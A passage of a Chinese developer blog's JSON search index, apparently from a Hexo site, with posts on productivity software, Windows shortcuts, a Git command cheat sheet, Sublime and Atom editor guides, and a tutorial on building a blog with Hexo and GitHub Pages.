初遇QQ音乐,处过天天动听,恋过酷狗，上过酷我，一夜情过千千静听,移情过虾米，和豆瓣FM好过，同百度随心听约过,最后，发现音乐的世界,还得是你～网易云音乐。 Atom: 新一代编码写文神器；虽还在发展，却已惊艳。 Git for Windows : 打包好了，直接使用；Git 一族必备。 Nodejs: 可以辅助让Sublime编译Js；可以做Web开发，REST开发**，Web聊天室/爬虫，Web博客(Hexo)，Web论坛等等，可参见分享十五个NodeJS应用场景；还可以利用Nodejs的包管理器Npm安装Gulp Webpack等屌炸天工具～做大多你可以想到的东东；Web端必备。 GoodSync: 文件同步好帮手。可以同步 本地文件 P2P 云(Dropbox,Google,OnDrive,FTP/SFTP等等)，还可以同步应用程序以及各设备；强大且不失简洁。比如：SFTP同步，用过SublimeText的SFTP(最方便，却老弹框)，WinSCP(F5即可同步，设计却不人性化)，Gulp的SFTP(只是需要率先Watch)，Xftp4(老牌了，都是手动点来点去，额)。 ShareX: 截图、注释、上传，复制 URL 一条龙服务；免费，强大而简洁；自动存储；支持双屏；支持录制；还有给力有用的工具集…大有相见恨晚之感 windows系统下实用不常见的快捷键： ALT+双击：查看文件属性 WIN+数字键：启动任务栏上的程序； CTRL+SHIFT+ESC：打开进程管理器 WIN+左箭头：当前窗口缩放为屏幕的一半，靠屏幕左侧显示； WIN+右箭头：当前窗口缩放为屏幕的一半，靠屏幕右侧显示； WIN+上箭头：最大化当前窗口； WIN+下箭头：还原和最小化当前窗口； WIN+R，输入“psr”后回车：打开步骤记录器； WIN+R，输入“mip”，启动数学公式手写板； WIN+T：切换任务栏上的程序 Ctrl+Shilt+N 新建文件夹 Win+B 将焦点移到任务栏托盘区 Ctrl+Shift+Alt+Tab 与Alt+Tab的区别在于后者按键松开后窗口会消失，而前者则不会 Win++++，是的你没看错，四个加号，第一个当然是正常的连接，后面三个表示连按三次键盘上的加号键。功能是打开Windows自带放大镜工具，将屏幕放大，在精细到像素的取色时我会用到 Ctrl+L 定位到地址栏并选中其中的文本","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://ru23.com/tags/Tools/"}]},{"title":"追求高效工作之路","slug":"2016-03-追求高效工作之路","date":"2016-03-15T04:36:41.000Z","updated":"2018-10-24T03:46:01.637Z","comments":true,"path":"note/5ceaeb60.html","link":"","permalink":"https://ru23.com/note/5ceaeb60.html","excerpt":"ToolsCollecting","text":"ToolsCollecting 工欲善其事，必先利其器！懵懵懂懂一路蹒跚过来，越发感到这一点的重要；而强大的器，更需要我们好生折腾一番。要知道：工匠在做工前打磨好工具，操作起来才能得心应手，方能达到事半功倍的效果。故此，从某个时候就开始在条不归路上扑通；这里便将涉及到的些许方面做下整理，以做后观，也算分享 For Android Development 八款Android 开发者必备的小工具 我是如何自学Android，资料分享（2015 版） For Web Development 10款前端必备的CSS工具 前端开发必备!Emmet使用手册 For Lua Development ZeroBrane Studio:一个轻量级的Lua IDE For Lua with code completion, syntax highlighting; live coding, remote debugger, and code analyzer 使用Ldoc给Lua生成文档:便捷为LuaCode生成文档. LWT: Lua-Web-Tools: Allows You To Develop Web Applications In Lua; Run Them Directly In The Apache HTTP Server. For Better Use Of Mac 那些你可能不知道的 OS X 使用技巧 用好这30个高频高效的快捷键 Mac安装软件新方法：Homebrew-cask Mac开发者常用的工具 For Better Use Of Windows 谈谈个人常用的软件 我的PC软件推荐 即用/实用 AutoHotkey 脚本推荐 如何简洁、优雅的使用Windows 高效工作Windows系统下的奇技淫巧大汇总 布置一个舒适的 Windows 使用环境 配置豪华的 Windows 开发环境 Windows 效率软件一览 For Better Use Of Markdown Markdown：让书写更美好 Markdown 资源整理 献给写作者的 Markdown 新手指南 Markdown小技巧集合 Markdown生态链整理 Pandoc : A Universal Document Converter Markdown写作进阶：Pandoc入门浅谈:详尽的讲述了Pandoc的安装以及基本使用； Pandoc Markdown写作规范 For Better Use Of Sublime Text 如何优雅地使用Sublime Text3 Sublime插件：增强篇 For Better Use Of Kindle 2014读书总结——kindle是人类进步的电梯 我是怎样使用Kindle的","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://ru23.com/tags/Tools/"}]},{"title":"Git常用命令备忘记录","slug":"2016-03-Git常用命令备忘记录","date":"2016-03-15T03:16:12.000Z","updated":"2018-10-24T03:46:01.528Z","comments":true,"path":"note/a0d4697b.html","link":"","permalink":"https://ru23.com/note/a0d4697b.html","excerpt":"Git配置","text":"Git配置 12345678910git config --global user.name &quot;robbin&quot; git config --global user.email &quot;fankai@gmail.com&quot;git config --global color.ui truegit config --global alias.co checkoutgit config --global alias.ci commitgit config --global alias.st statusgit config --global alias.br branchgit config --global core.editor &quot;mate -w&quot; # 设置Editor使用textmategit config -l # 列举所有配置用户的git配置文件~/.gitconfig Git常用命令:查看、添加、提交、删除、找回，重置修改文件** 1234567891011121314151617181920212223242526git help &lt;command&gt; # 显示command的helpgit show # 显示某次提交的内容git show $idgit co -- &lt;file&gt; # 抛弃工作区修改git co . # 抛弃工作区修改git add &lt;file&gt; # 将工作文件修改提交到本地暂存区git add . # 将所有修改过的工作文件提交暂存区git rm &lt;file&gt; # 从版本库中删除文件git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件git reset &lt;file&gt; # 从暂存区恢复到工作文件git reset -- . # 从暂存区恢复到工作文件git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改git ci &lt;file&gt; git ci .git ci -a # 将git add, git rm和git ci等操作都合并在一起做git ci -am &quot;some comments&quot;git ci --amend # 修改最后一次提交记录git commit --amend #修改最后一次提交注释的，利用–amend参数 git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建了一次提交对象git revert HEAD # 恢复最后一次提交的状态 查看文件diff** 1234567git diff &lt;file&gt; # 比较当前文件和暂存区文件差异git diffgit diff &lt;$id1&gt; &lt;$id2&gt; # 比较两次提交之间的差异git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较 git diff --staged # 比较暂存区和版本库差异git diff --cached # 比较暂存区和版本库差异git diff --stat # 仅仅比较统计信息 查看提交记录** 12345git loggit log &lt;file&gt; # 查看该文件每次提交记录git log -p &lt;file&gt; # 查看每次详细修改内容的diffgit log -p -2 # 查看最近两次详细修改内容的diffgit log --stat # 查看提交统计信息 tigGit 本地分支管理查看、切换、创建和删除分支 123456789101112131415git br -r # 查看远程分支git br &lt;new_branch&gt; # 创建新的分支git br -v # 查看各个分支最后提交信息git br --merged # 查看已经被合并到当前分支的分支git br --no-merged # 查看尚未被合并到当前分支的分支git co &lt;branch&gt; # 切换到某个分支git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branchgit co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支git br -d &lt;branch&gt; # 删除某个分支git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制) 分支合并和rebase** 12345git merge &lt;branch&gt; # 将branch分支合并到当前分支git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交git rebase master &lt;branch&gt; # 将master rebase到branch，相当于：git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt; Git补丁管理(方便在多台机器上开发同步时用)123git diff &gt; ../sync.patch # 生成补丁git apply ../sync.patch # 打补丁git apply --check ../sync.patch # 测试补丁能否成功 Git暂存管理 1234git stash # 暂存git stash list # 列所有stashgit stash apply # 恢复暂存的内容git stash drop # 删除暂存区 Git远程分支管理 12345678910111213git pull # 抓取远程仓库所有分支更新并合并到本地git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并git fetch origin # 抓取远程仓库更新git merge origin/master # 将远程主分支合并到本地当前分支git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上git push # push所有分支git push origin master # 将本地主分支推到远程主分支git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支 Git远程仓库管理 12345git remote -v # 查看远程服务器地址和仓库名称git remote show origin # 查看远程服务器仓库状态git remote add origin git@github:robbin/robbin_site.git # 添加远程仓库地址git remote set-url origin git@github.com:robbin/robbin_site.git # 设置远程仓库地址(用于修改远程仓库地址)git remote rm &lt;repository&gt; # 删除远程仓库 创建远程仓库 123456789git clone --bare robbin_site robbin_site.git # 用带版本的项目创建纯版本仓库scp -r my_project.git git@git.csdn.net:~ # 将纯仓库上传到服务器上mkdir robbin_site.git &amp;&amp; cd robbin_site.git &amp;&amp; git --bare init # 在服务器创建纯仓库git remote add origin git@github.com:robbin/robbin_site.git # 设置远程仓库地址git push -u origin master # 客户端首次提交git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且trackgit remote set-head origin master # 设置远程仓库的HEAD指向master分支 也可以命令设置跟踪远程库和本地库 12git branch --set-upstream master origin/mastergit branch --set-upstream develop origin/develop","categories":[{"name":"VCS","slug":"VCS","permalink":"https://ru23.com/categories/VCS/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://ru23.com/tags/GitHub/"}]},{"title":"Sublime Text资源整理篇","slug":"2016-03-Sublime-Text资源整理篇","date":"2016-03-15T01:40:30.000Z","updated":"2018-10-24T03:46:01.546Z","comments":true,"path":"note/ae4ebfd1.html","link":"","permalink":"https://ru23.com/note/ae4ebfd1.html","excerpt":"Sublime Text：学习资源篇","text":"Sublime Text：学习资源篇 官网 http://www.sublimetext.com/ 插件 https://packagecontrol.io 教程 sublime常用快捷键和优秀插件 Sublime Text 全程指南 Sublime Text 2 入门及技巧 Sublime Text 使用介绍、全套快捷键及插件推荐 Sublime Text 3 学习及使用 Sublime Text 3 使用心得 Sublime Text 3 新手上路：必要的安裝、設定與基本使用教學 6 Ways to Turn Sublime Text Into the Perfect Blogging Tool[[%? &amp;topic=_custom]]Scotch Series Best of Sublime Text 3: Features, Plugins, and Settings Sublime Text Keyboard Shortcuts THE COMPLETE VISUAL GUIDE TO SUBLIME TEXT 3 Themes, Color Schemes, and Cool Features Getting Started and Keyboard Shortcuts Plugins Part 1 Plugins Part 2 Working With Code Snippets In Sublime Text 视频 快乐的sublime编辑器 前端开发工具技巧介绍—Sublime篇 Perfect Workflow in Sublime Text 2 书籍 Sublime Text 手冊 Sublime Text Unofficial Documentation Sublime Text Power User Instant Sublime Text Starter Mastering Sublime Text Sublime Productivity Sublime Text 系列 Sublime Text：学习资源篇 Sublime插件：增强篇 Sublime插件：Markdown篇 Sublime插件：C语言篇","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"Hexo+GitHub搭建免费博客","slug":"2016-03-Hexo-GitHub搭建免费博客","date":"2016-03-14T11:33:57.000Z","updated":"2018-10-24T03:46:01.537Z","comments":true,"path":"note/c01af22e.html","link":"","permalink":"https://ru23.com/note/c01af22e.html","excerpt":"第一部分 基本介绍","text":"第一部分 基本介绍 一直想自己搭建一个博客,断断续续,折折腾腾了两天多的多时间,终于算是搭建完毕了. 为什么要搭建博客呢? 想有个属于自己的博客空间 世面上的平台不够好看 佩服那些有博客的人,所以自己也想搞一个 独立的才是自己的。 但是不懂服务器,没有空间,不懂前端怎么破? 小白进入门槛1、非常折腾，需要耐心；2、也需要一定的学习能力和钻研精神；3、懂一些网页基础知识 本博客是利用 Hexo +Github搭建,主题是 Next ,感觉不错,不需要什么上面所说的知识,也能搭建成功,方便也美观 为什么选择GitHub Pages？很多人用wordpress，你为什么要用github pages来搭建？ github pages有300M免费空间，资料自己管理，保存可靠； 学着用github，享受github的便利，上面有很多大牛，眼界会开阔很多； 顺便看看github工作原理，最好的团队协作流程； github是趋势； 就算github被墙了，我可以搬到国内的gitcafe中去。 搭建需要懂得github基本操作 不会GitHub的参考如下文章： 使用Github Pages建独立博客 GitHub的简单使用 史上最全github使用方法：github入门到精通 github搭建动态网站 第二部分 Hexo+GitHub搭建博客 环境准备 安装Node到Node.js官网下载相应平台的最新版本，一路安装即可 安装Git GitHub 首先注册一个『GitHub』帐号，已有的默认默认请忽略 建立与你用户名对应的仓库，仓库名必须为『your_user_name.github.com』 添加SSH公钥到『Account settings -&gt; SSH Keys -&gt; Add SSH Key』 首先设置你的用户名密码： git config --global user.email &quot;4353@qq.com&quot; git config --global user.name &quot;653b&quot; 生成密钥： ssh-keygen -t rsa -C &quot;faa@qq.com&quot; 最后可以验证一下：ssh -T git@github.com 安装 Node和Git都安装好后，可执行如下命令安装hexo： npm install -g hexo 初始化 执行init命令初始化hexo到你指定的目录：hexo init &lt;folder&gt; 也可以cd到目标目录，执行hexo init。 至此，全部安装工作已经完成！ 生成静态页面 cd 到你的init目录，执行如下命令hexo generate 本地启动 执行如下命令，启动本地服务，进行文章预览调试 hexo server浏览器输入http://localhost:4000就可以看到效果 写文章 执行new命令，生成指定名称的文章至hexo\\source_posts\\postName.md hexo new [layout] &quot;postName&quot; #新建文章 其中layout是可选参数，默认值为post。有哪些layout呢，请到scaffolds目录下查看，这些文件名称就是layout名称。当然你可以添加自己的layout，方法就是添加一个文件即可，同时你也可以编辑现有的layout，比如post的layout默认是hexo\\scaffolds\\post.md 123title: &#123; &#123; title &#125; &#125;date: &#123; &#123; date &#125; &#125;tags: 想添加categories，以免每次手工输入，只需要修改这个文件添加一行，如下： 12345title: &#123; &#123; title &#125; &#125;date: &#123; &#123; date &#125; &#125;categories: tags: --- 接下来，你就可以用喜爱的编辑器尽情书写你的文章 实现fancybox效果 只需要在你的文章*.md文件的头上添加photos项即可，然后一行行添加你要展示的照片： 1234567layout: phototitle: 我的阅历date: 2085-01-16 07:33:44tags: [hexo]photos:- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-0.jpg- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-1.jpg 不想每次都手动添加怎么办？同样的，打开您的hexo\\scaffolds\\photo.md 12345&gt;layout: &#123; &#123; layout &#125; &#125;title: &#123; &#123; title &#125; &#125;date: &#123; &#123; date &#125; &#125;tags: photos: 然后每次可以执行带layout的new命令生成照片文章： hexo new photo &quot;photoPostName&quot; #新建照片文章 主题安装 hexo的主题列表Hexo Themes。比较喜欢pacman，modernist、next。Pacman最为优秀，简洁大方小清新，同时移动版本支持的也很好 安装主题的方法就是一句git命令： 1git clone https://github.com/heroicyang/hexo-theme-modernist.git themes/modernist 安装完成后，打开hexo\\_config.yml，修改主题为modernist 打开hexo\\themes\\modernist目录，编辑主题配置文件_config.yml： 更新主题 cd themes/modernistgit pull hexo命令行使用常用命令： hexo help #查看帮助 hexo init #初始化一个目录 hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成网页，可以在 public 目录查看整个网站的文件 hexo server #本地预览，’Ctrl+C’关闭 hexo deploy #部署.deploy目录 hexo clean #清除缓存，**强烈建议每次执行命令前先清理缓存，每次部署前先删除 .deploy 简写： hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy 第三方服务 为NexT主题添加文章阅读量统计功能 为hexo添加多说评论 教你用swiftype为Hexo添加站内搜索 图床 1.墙裂推荐七牛云储存,注册地址。2.七牛云储存提供10G的免费空间,以及每月10G的流量.存放个人博客图片最好不过了具体使用见使用七牛作为github博客的图床 域名 将独立域名与GitHub Pages的空间绑定 方法一：在站点source目录下面，新建一个名为CNAME的文本文件，里面写入你要绑定的域名，比如wuxiaolong.me 方法二：在Repository的根目录下面，新建一个名为CNAME的文本文件，里面写入你要绑定的域名，比如wuxiaolong.us DNS设置用DNSpod，快，免费，稳定。注册DNSpod，添加域名，如下图设置。 其中A的两条记录指向的ip地址是github Pages的提供的ip如何知道你的github上项目的IP 去Godaddy修改DNS地址更改godaddy的Nameservers为DNSpod的NameServers。 至此，基本操作介绍完毕，以下内容普通用户无需了解 目录介绍 默认目录结构： 12345678910├── .deploy├── public├── scaffolds├── scripts├── source| ├── _drafts| └── _posts├── themes├── _config.yml└── package.json .deploy：执行hexo deploy命令部署到GitHub上的内容目录 public：执行hexo generate命令，输出的静态网页内容目录 scaffolds：layout模板文件目录，其中的md文件可以添加编辑 scripts：扩展脚本目录，这里可以自定义一些javascript脚本 source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。 _drafts：草稿文章 _posts：发布文章 themes：主题文件目录 _config.yml：全局配置文件，大多数的设置都在这里 package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮 修改局部页面 页面展现的全部逻辑都在每个主题中控制，源代码在hexo\\themes\\你使用的主题\\中，以modernist主题为例： 1234567891011121314151617├── languages #多语言| ├── default.yml #默认语言| └── zh-CN.yml #中文语言├── layout #布局，根目录下的*.ejs文件是对主页，分页，存档等的控制| ├── _partial #局部的布局，此目录下的*.ejs是对头尾等局部的控制| └── _widget #小挂件的布局，页面下方小挂件的控制├── source #源码| ├── css #css源码 | | ├── _base #*.styl基础css| | ├── _partial #*.styl局部css| | ├── fonts #字体| | ├── images #图片| | └── style.styl #*.styl引入需要的css源码| ├── fancybox #fancybox效果源码| └── js #javascript源代码├── _config.yml #主题配置文件└── README.md #用GitHub的都知道 插件 安装插件：npm install &lt;plugin-name&gt; --save 启用插件：在*hexo_config.yml文件添加： plugins: - &lt;plugin-name&gt; #插件名 升级插件： npm update 卸载插件：npm uninstall &lt;plugin-name&gt; 迁移hexo支持从其他类型站点迁移，如通用RSS，Jekyll，Octopress，WordPress等。请参考官方文档Hexo Migration。 更新 更新hexo：npm update -g hexo 更新主题：cd themes/你的主题 git pull 换机器写博客 保留好自己的博客源码。换机器写博客，就只能使用各种网盘的同步功能，或者你把你的站点源文件提交到某代码托管服务器。另外，貌似这篇很牛逼，Hexo 服务器端布署及 Dropbox 同步。 办法是这样的，先在一个目录下做好Node+Git+Hexo的绿色环境，写个hexos.bat可以一键启动hexo工作台，把整个目录用Dropbox同步，这样随便在办公室或家的任何笔记本台式机都可以写博客，也不用处理什么文件拷贝备份的事情 问题详解 hexo 部署至Git遇到的坑 Hexo常见问题解决方案 总结 对于一个不懂什么服务器,什么前端的人来说,Hexo+Github给搭建个人博客带来了很大的便利. 搭建博客不是心血来潮,也并不是一帆风顺的,所以需要耐心,折腾得起才行. 很多教程已经过时,多看官方文档. 搭建博客并不是必须,写笔记文章找个平台也是可以的. 搭建博客才是第一步,坚持写好文章才是关键,路还很长. 参考： Hexo官网 Hexo + GitHub 博客搭建之旅 配置 - Hexo 中文版 - 极客学院Wiki 零基础免费搭建个人博客-hexo+github 5 分钟快速安装Next主题 Themes · hexojs/hexo Wiki Hexo 主题开发指南","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/tags/Hexo/"}]},{"title":"编码神器Atom使用详解","slug":"2016-03-编码神器Atom使用详解","date":"2016-03-14T08:21:16.000Z","updated":"2018-10-24T03:46:01.634Z","comments":true,"path":"note/96063689.html","link":"","permalink":"https://ru23.com/note/96063689.html","excerpt":"Atom 是 Github 专门为程序员推出的一个跨平台文本编辑器。她很大程度上继承了SublimeText的美，而又不仅如此。而如今试用了 Atom 一个多月以来，我被迫见异思迁了，幸好我不是一个喜新厌旧的男人～在编码砌字时，很多时候一款编辑器的标签不够用的，所以现在两款兼而用之。 Atom与SublimeText3对比","text":"Atom 是 Github 专门为程序员推出的一个跨平台文本编辑器。她很大程度上继承了SublimeText的美，而又不仅如此。而如今试用了 Atom 一个多月以来，我被迫见异思迁了，幸好我不是一个喜新厌旧的男人～在编码砌字时，很多时候一款编辑器的标签不够用的，所以现在两款兼而用之。 Atom与SublimeText3对比 Atom1.0之后，有比Sublime更美的UI，不输Sublime的插件包，比Sublime更加舒适的细节，比如：Atom下cmd-\\ 显示或隐藏目录树；（Sublime默认是 Ctrl＋K+B ）。更为简洁人性化的设置/插件安装等（当然SublimeText也不太复杂）。 Atom算是一款web app，源码都是 CoffeeScript 写的，连界面都可以用 CSS来自定义，扩展可以用JS开发，完全可以深度定制打造自己的IDE。Sublime基于Python，两者扩展性都非常强。 Atom 暂时还是免费的。而SublimeText，额，一直会弹那个框(使用网上注册码？)。 对 Markdown的支持更加完美(见下文)；这一点真心是赞的不要不要的。 类Web App嘛，对各平台的支持更为有好；比如：在mac下打开xxx文件/文件夹，Atom：terminal下直接 atom xxx即可。而SublimeText会相对繁琐很多，比如为其添加系统别名，可参见Mac必备软件渐集之ZSH－终极Shell。windows下，安装了Atom，就已经在鼠标右键列表了。 Atom,类Web的年轻一代编辑神器，在打开软件速度上稍逊SublimeText3。相比之下，对大文件响应处理上相比之下，还需很大提升。不过潜力还是挺足的。 Atom 有友好的中文社区Atom China。 关于如何初步使用Atom，可以参见 官方手册：Atom 基础使用。 Atom安装篇Atom软件本身安装 可以去Atom官网下载安装包，跟普通安装一致。 可以在终端terminal中安装： Mac OS ~ brew install Caskroom/cask/atom Window OS可以用管理员身份打开Powershell，然后用 choco install 去安装 Atom. choco install atom 这一点具体可以参见文章： Win下必备神器之Cmder Atom的插件安装 Command+Shift+P呼出设置界面，点击 Install，在调出的页面输入框中输入你想安装的插件名，搜索这个插件，然后再出现的插件选项中点击下载。 Atom编辑器还自带了一个叫做apm(Atom PackageManager)的包管理工具，用过npm的同学应该对包管理工具不会陌生，我们可以通过apm查找Atom插件，安装和删除插件等操作。比如对emmet插件的操作。 //查找~ apm search emmet//安装~ apm install emmet//删除~ apm remove emmet Atom快捷键篇文件切换 ctrl-shift-s 保存所有打开的文件cmd-shift-o 打开目录cmd-\\ 显示或隐藏目录树ctrl-0 焦点移到目录树目录树下，使用a，m，delete来增加，修改和删除cmd-t或cmd-p 查找文件cmd-b 在打开的文件之间切换cmd-shift-b 只搜索从上次git commit后修改或者新增的文件 导航 （等价于上下左右）ctrl-p 前一行ctrl-n 后一行ctrl-f 前一个字符ctrl-b 后一个字符alt-B, alt-left 移动到单词开始alt-F, alt-right 移动到单词末尾cmd-right, ctrl-E 移动到一行结束cmd-left, ctrl-A 移动到一行开始cmd-up 移动到文件开始cmd-down 移动到文件结束ctrl-g 移动到指定行 row:column 处cmd-r 在方法之间跳转 目录树操作 cmd-\\ 或者 cmd-k cmd-b 显示(隐藏)目录树ctrl-0 焦点切换到目录树(再按一次或者Esc退出目录树)a 添加文件d 将当前文件另存为(duplicate)i 显示(隐藏)版本控制忽略的文件alt-right 和 alt-left 展开(隐藏)所有目录ctrl-al-] 和 ctrl-al-[ 同上ctrl-[ 和 ctrl-] 展开(隐藏)当前目录ctrl-f 和 ctrl-b 同上cmd-k h 或者 cmd-k left 在左半视图中打开文件cmd-k j 或者 cmd-k down 在下半视图中打开文件cmd-k k 或者 cmd-k up 在上半视图中打开文件cmd-k l 或者 cmd-k right 在右半视图中打开文件ctrl-shift-C 复制当前文件绝对路径书签cmd-F2 在本行增加书签F2 跳到当前文件的下一条书签shift-F2 跳到当前文件的上一条书签ctrl-F2 列出当前工程所有书签 选取 大部分和导航一致，只不过加上shift ctrl-shift-P 选取至上一行ctrl-shift-N 选取至下一样ctrl-shift-B 选取至前一个字符ctrl-shift-F 选取至后一个字符alt-shift-B, alt-shift-left 选取至字符开始alt-shift-F, alt-shift-right 选取至字符结束ctrl-shift-E, cmd-shift-right 选取至本行结束ctrl-shift-A, cmd-shift-left 选取至本行开始cmd-shift-up 选取至文件开始cmd-shift-down 选取至文件结尾cmd-A 全选cmd-L 选取一行，继续按回选取下一行ctrl-shift-W 选取当前单词 编辑和删除文本基本操作 ctrl-T 使光标前后字符交换cmd-J 将下一行与当前行合并ctrl-cmd-up, ctrl-cmd-down 使当前行向上或者向下移动cmd-shift-D 复制当前行到下一行cmd-K, cmd-U 使当前字符大写cmd-K, cmd-L 使当前字符小写 删除和剪切 ctrl-shift-K 删除当前行cmd-backspace 删除到当前行开始cmd-fn-backspace 删除到当前行结束ctrl-K 剪切到当前行结束alt-backspace 或 alt-H 删除到当前单词开始alt-delete 或 alt-D 删除到当前单词结束 多光标和多处选取 cmd-click 增加新光标cmd-shift-L 将多行选取改为多行光标ctrl-shift-up, ctrl-shift-down 增加上（下）一行光标cmd-D 选取文档中和当前单词相同的下一处ctrl-cmd-G 选取文档中所有和当前光标单词相同的位置 括号跳转 ctrl-m 相应括号之间，html tag之间等跳转ctrl-cmd-m 括号(tag)之间文本选取alt-cmd-. 关闭当前XML/HTML tag 编码方式 ctrl-shift-U 调出切换编码选项 查找和替换 cmd-F 在buffer中查找cmd-shift-f 在整个工程中查找 代码片段 alt-shift-S 查看当前可用代码片段 在~/.atom目录下snippets.cson文件中存放了你定制的snippets 定制说明 自动补全 ctrl-space 提示补全信息 折叠 alt-cmd-[ 折叠alt-cmd-] 展开alt-cmd-shift-{ 折叠全部alt-cmd-shift-} 展开全部cmd-k cmd-N 指定折叠层级 N为层级数 文件语法高亮 ctrl-shift-L 选择文本类型 使用Atom进行写作 ctrl-shift-M Markdown预览 可用代码片段 b, legal, img, l, i, code, t, table git操作 cmd-alt-Z checkout HEAD 版本cmd-shift-B 弹出untracked 和 modified文件列表alt-g down alt-g up 在修改处跳转alt-G D 弹出diff列表alt-G O 在github上打开文件alt-G G 在github上打开项目地址alt-G B 在github上打开文件blamealt-G H 在github上打开文件historyalt-G I 在github上打开issuesalt-G R 在github打开分支比较alt-G C 拷贝当前文件在gihub上的网址 推荐一些好用的插件主题 seti-uiA dark colored UI theme for Atom with custom file icons. (+Seti Syntax)atom-material-ui 好看到爆atom-material-syntax 美化 atom-beautify 一键代码美化file-icons 给文件加上好看的图标atom-minimap 方便美观的缩略滚动图 git atomatigit 可视化git操作 代码提示 emmet 这个不用介绍了吧，前端开发必备，谁用谁知道；atom-ternjs js代码提示很强大，高度定制化docblockr jsdoc 给js添加注释color-picker 取色器 必备插件pigments 颜色显示插件 必装terminal-panel 直接在atom里面写命令了svg-preview svg预览 便捷操作 advanced-open-file 快速打开、切换文件 代码校验 linter代码校验工具;A Base Linter with Cow Powers Web前端 autoclose-html 闭合html标签language-vue-component Atom编写Vue高亮vue-autocompile Auto compiles vue in atomlanguage-vue Syntax highlighting for vue component files其插件已相当丰满，可以在这里搜索查找。Packages make Atom do amazing things. 舒爽书写作(Markdown) Atom有自带MarkdownPreview,支持Ctrl＋Shift＋M实时预览。装上markdown-writer插件，根据其默认配置:Settings for Keymaps，完美；想必之下比SublimeText下的书写爽很多；也比简书，作业部落要更为强大。 比如对已经写下的文字加粗，选中 Command＋B即可；如果文字还没写，空格下 Command＋B 就会生成 ｜，光标在第二个*之后，很是方便。 当然这快捷是可以更改的， cmd + shift + p输入setting呼出设置界面自行更改。 markdown-writer书写 Markdown 默认快捷键如下： 快捷键操作 作用效果“shift-cmd-K”: “markdown-writer : insert-link”“shift-cmd-I”: “markdown-writer : insert-image”“cmd-i”: “markdown-writer : toggle-italic-text”“cmd-b”: “markdown-writer : toggle-bold-text”“cmd-‘“: “markdown-writer : toggle-code-text”“cmd-k”: “markdown-writer : toggle-keystroke-text”“cmd-h”: “markdown-writer : toggle-strikethrough-text”“ctrl-alt-1”: “markdown-writer : toggle-h1”“ctrl-alt-2”: “markdown-writer : toggle-h2”“ctrl-alt-3”: “markdown-writer : toggle-h3”“ctrl-alt-4”: “markdown-writer : toggle-h4”“ctrl-alt-5”: “markdown-writer : toggle-h5”“shift-cmd-O”: “markdown-writer : toggle-ol”“shift-cmd-U”: “markdown-writer : toggle-ul”“shift-cmd-&gt;”: “markdown-writer : toggle-blockquote”‘shift-cmd-“‘: “markdown-writer : toggle-codeblock-text”“cmd-j cmd-p”: “markdown-writer : jump-to-previous-heading”“cmd-j cmd-n”: “markdown-writer : jump-to-next-heading”“cmd-j cmd-d”: “markdown-writer : jump-between-reference-definition”“cmd-j cmd-t”: “markdown-writer : jump-to-next-table-cell” 本文转载自： [新编码神器Atom使用纪要][30]","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Atom","slug":"Atom","permalink":"https://ru23.com/tags/Atom/"}]},{"title":"各种速查表收集整理","slug":"2016-03-各种速查表收集整理","date":"2016-03-14T08:08:24.000Z","updated":"2018-10-24T03:46:01.625Z","comments":true,"path":"note/83ccabf5.html","link":"","permalink":"https://ru23.com/note/83ccabf5.html","excerpt":"前端工程师知识体系","text":"前端工程师知识体系 HTML+CSS相关 HTML5属性速查表 HTML知识网总结 Emmet插件命令速查表 css知识网总结 DIV+css命名规范 IDE相关 Vim键盘图&amp;&amp;快捷键 Atom快捷键 webstorm快捷键 sublime快捷键 GitHub速查表 设计相关 网站UI设计 